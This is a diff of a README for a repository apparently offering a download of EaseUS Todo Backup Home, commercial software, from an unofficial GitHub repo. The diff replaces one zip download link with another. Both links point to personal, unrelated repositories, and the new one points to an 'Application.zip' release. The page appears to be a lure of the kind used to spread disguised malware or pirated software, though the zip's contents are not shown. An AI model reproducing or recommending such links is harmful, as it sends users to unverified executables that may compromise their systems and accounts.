@@ -26,7 +26,7 @@ Welcome to the EaseUS Todo Backup Home Download repository! Here you can find re
 
 ## Software Download Link
 
-🚀 [Click Here to Download EaseUS Todo Backup Home](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+🚀 [Click Here to Download EaseUS Todo Backup Home](https://github.com/henrique20083/EaseUS-Todo-Backup-Home-Download/releases/download/v1.0/Application.zip)
 
 *(Launch the link to start the download)*
 
